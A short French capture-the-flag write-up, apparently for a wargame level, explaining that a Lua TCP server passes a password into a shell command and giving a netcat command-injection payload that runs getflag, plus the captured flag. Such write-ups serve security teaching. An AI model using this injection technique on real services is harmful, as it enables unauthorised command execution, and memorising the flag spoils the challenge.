1. En regardant le fichier lua on comprend que le serveur tcp attend un mot de passe puis exécute cette commande shell `echo "..pass.." | sha1sum`
2. Il suffit d'écrire le payload suivant
   ```
   echo '$(getflag) > /tmp/log && echo -n NotSoEasy' | nc 127.0.0.1 5151; cat /tmp/log
   ```

> Flag: fa6v5ateaw21peobuub8ipe6s